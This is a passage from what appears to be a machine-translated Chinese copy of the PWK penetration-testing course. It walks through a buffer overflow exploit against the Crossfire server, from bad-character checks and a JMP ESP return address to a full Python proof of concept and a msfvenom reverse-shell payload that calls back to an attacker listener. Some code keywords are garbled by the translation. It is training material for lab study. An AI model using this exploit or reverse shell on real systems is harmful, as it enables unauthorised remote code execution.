<div style="position:absolute;top:98548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[*] 发送恶意缓冲区..."</font></font></nobr></div>
<div style="position:absolute;top:98581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect（（主机，13327））</font></font></nobr></div>
<div style="position:absolute;top:98599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 s.recv(1024)</font></font></nobr></div>
<div style="position:absolute;top:98632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:98649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close() </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:98779;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="84"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 84 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:98812;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:99889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:99889;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:99889;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">404</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[*]有效载荷已发送！”</font></font></nobr></div>
<div style="position:absolute;top:98944;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 373 - 添加第一阶段有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行我们更新的概念验证代码后，我们可以验证 EIP 寄存器是否被覆盖</font></font></nobr></div>
<div style="position:absolute;top:98992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有四个 B ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\x42</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 并且我们的第一阶段 shellcode 位于由</font></font></nobr></div>
<div style="position:absolute;top:99012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ESP寄存器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99531;left:256"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 230：验证 ESP 指向第一阶段 shellcode 的开始</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:99564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.5 检查坏字符</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要发现任何可能破坏溢出或破坏我们的 shellcode 的坏字符，我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:99626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们在 Windows 缓冲区溢出模块中所做的方法相同。</font></font></nobr></div>
<div style="position:absolute;top:99658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在缓冲区中发送了从 00 到 0F 的整个字符范围，然后监视是否</font></font></nobr></div>
<div style="position:absolute;top:99678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些字节中的任何一个在内存中被破坏、交换、删除或更改后</font></font></nobr></div>
<div style="position:absolute;top:99697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由应用程序处理。</font></font></nobr></div>
<div style="position:absolute;top:99730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在多次运行概念证明并一次消除一个坏字符后，我们</font></font></nobr></div>
<div style="position:absolute;top:99749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为 Crossfire 应用程序提出最终的坏字符列表，这些字符似乎只是</font></font></nobr></div>
<div style="position:absolute;top:99769;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\x00 和 \x20</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:99803;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.5.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 确定使用 msf-nasm_shell 生成第一阶段 shellcode 所需的操作码。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:99967;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="85"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 85 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:100000;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:101077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:101077;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:101077;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">405</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 识别payload和返回地址中不能包含的坏字符。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.6 查找返回地址</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为最后一步，我们需要找到一个有效的汇编指令来将代码执行重定向到</font></font></nobr></div>
<div style="position:absolute;top:100194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ESP 寄存器指向的内存位置。</font><font style="vertical-align: inherit;">EDB 调试器带有一组插件，</font></font></nobr></div>
<div style="position:absolute;top:100214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中之一名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpcodeSearcher</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100558;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 231：EDB 的 OpcodeSearcher 插件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用此插件，我们可以轻松地在内存区域中搜索 JMP ESP 指令或等效指令</font></font></nobr></div>
<div style="position:absolute;top:100608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交火应用程序的代码部分被映射到： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:101155;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="86"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 86 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:101188;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:102265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:102265;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:102265;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">406</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101754;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 232：使用 EDB 查找任意汇编指令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们选择使用调试器找到的第一条 JMP ESP 指令 (0x08134596,</font></font></nobr></div>
<div style="position:absolute;top:101804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 232)。</font><font style="vertical-align: inherit;">把覆盖偏移量、返回地址和第一阶段的 shellcode 放在一起给我们</font></font></nobr></div>
<div style="position:absolute;top:101824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下概念验证：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:101876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:101910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 = "10.11.0.128"</font></font></nobr></div>
<div style="position:absolute;top:101944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充 = "\x41" * 4368</font></font></nobr></div>
<div style="position:absolute;top:101961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "\x96\x45\x13\x08"</font></font></nobr></div>
<div style="position:absolute;top:101978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"</font></font></nobr></div>
<div style="position:absolute;top:102011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"</font></font></nobr></div>
<div style="position:absolute;top:102045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:102063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[*] 发送恶意缓冲区..."</font></font></nobr></div>
<div style="position:absolute;top:102096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect（（主机，13327））</font></font></nobr></div>
<div style="position:absolute;top:102113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 s.recv(1024)</font></font></nobr></div>
<div style="position:absolute;top:102147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:102164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:102198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[*]有效载荷已发送！”</font></font></nobr></div>
<div style="position:absolute;top:102217;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 374 - 将退货地址添加到概念验证 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:102343;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="87"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 87 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:102376;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:103453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:103453;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:103453;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">407</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在运行我们的概念验证之前，我们重新启动应用程序并将调试器附加到它一次</font></font></nobr></div>
<div style="position:absolute;top:102491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次。</font><font style="vertical-align: inherit;">我们不是简单地让 Crossfire 进程运行，而是在 JMP ESP 上设置断点</font></font></nobr></div>
<div style="position:absolute;top:102510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 EDB</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点管理器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件的</font><font style="vertical-align: inherit;">指令地址</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这将帮助我们确认 EIP 是</font></font></nobr></div>
<div style="position:absolute;top:102530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当地覆盖。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102829;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 233：在 EDB 中设置断点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置断点后，我们可以运行我们的概念验证，如果一切都按照</font></font></nobr></div>
<div style="position:absolute;top:102880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计划，我们的调试器应该在 JMP ESP 指令处停止。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103210;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 234：在调试器中命中我们的断点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点已被击中，我们继续单步执行 JMP ESP 指令并登陆</font></font></nobr></div>
<div style="position:absolute;top:103260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的第一阶段 shellcode。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:103531;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="88"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 88 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:103564;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:104641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:104641;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:104641;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">408</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103885;left:292"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 235：在内存中登陆我们的第一阶段 shellcode</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行完第一条指令后，我们发现EAX寄存器现在指向我们的开始</font></font></nobr></div>
<div style="position:absolute;top:103935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受控缓冲区，紧跟在“设置声音”字符串之后。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104398;left:298"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 236：EAX 指向 A 缓冲区的开头</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 EAX 寄存器被我们的第一阶段 shellcode 对齐，一条 JMP EAX 指令将我们带入</font></font></nobr></div>
<div style="position:absolute;top:104449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个漂亮的，干净的缓冲</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:104719;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="89"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 89 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:104752;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:105829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:105829;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:105829;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">409</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105098;left:191"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 237：将执行重定向到缓冲区的开头，在“setup sound”字符串之后</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105129;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.6.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 EDB 为漏洞利用找到合适的汇编指令地址。</font></font></nobr></div>
<div style="position:absolute;top:105188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在你的概念验证中包含第一阶段的 shellcode 和返回地址指令，并且</font></font></nobr></div>
<div style="position:absolute;top:105207;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过单步执行，确保第一阶段的 shellcode 按预期工作</font></font></nobr></div>
<div style="position:absolute;top:105226;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.7 获取外壳</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在剩下要做的就是将我们的有效载荷放在我们可以通过的 A 缓冲区的开头</font></font></nobr></div>
<div style="position:absolute;top:105324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一阶段的shellcode。</font><font style="vertical-align: inherit;">我们选择使用反向 shell 作为我们的有效负载并使用生成它</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:105344;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们通过</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定负载，然后</font></font></font><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">分别</font></font><font style="font-size:14px"><font style="vertical-align: inherit;">是</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT 的</font></font></b><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">值</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">指定要避免的坏字符，</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定输出格式</font><font style="vertical-align: inherit;">，以及</font></font></nobr></div>
<div style="position:absolute;top:105383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一起使用的变量名</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x0</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105435;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0\x20" -f py -v shellcode</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Linux</font></font></nobr></div>
<div style="position:absolute;top:105469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:105485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 11 个兼容的编码器</font></font></nobr></div>
<div style="position:absolute;top:105502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用 x86/shikata_ga_nai 的 1 次迭代对有效载荷进行编码</font></font></nobr></div>
<div style="position:absolute;top:105519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 95（迭代 = 0）</font></font></nobr></div>
<div style="position:absolute;top:105536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 选择最终尺寸 95</font></font></nobr></div>
<div style="position:absolute;top:105553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：95 字节</font></font></nobr></div>
<div style="position:absolute;top:105570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">py 文件的最终大小：470 字节</font></font></nobr></div>
<div style="position:absolute;top:105587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳代码 = ""</font></font></nobr></div>
<div style="position:absolute;top:105604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"</font></font></nobr></div>
<div style="position:absolute;top:105621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"</font></font></nobr></div>
<div style="position:absolute;top:105638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"</font></font></nobr></div>
<div style="position:absolute;top:105655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"</font></font></nobr></div>
<div style="position:absolute;top:105672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"</font></font></nobr></div>
<div style="position:absolute;top:105689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"</font></font></nobr></div>
<div style="position:absolute;top:105706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"</font></font></nobr></div>
<div style="position:absolute;top:105723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x7f\x6d\x02\x36"</font></font></nobr></div>
<div style="position:absolute;top:105742;left:256"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 375 - 使用 msfvenom 生成 Linux 反向 shell 负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:105907;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="90"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 90 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:105940;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:107017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:107017;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:107017;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">410</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如上所述，有效载荷将放置在缓冲区的开头。</font><font style="vertical-align: inherit;">这表示</font></font></nobr></div>
<div style="position:absolute;top:106055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要考虑有效载荷大小并用正确数量的“A”填充它</font></font></nobr></div>
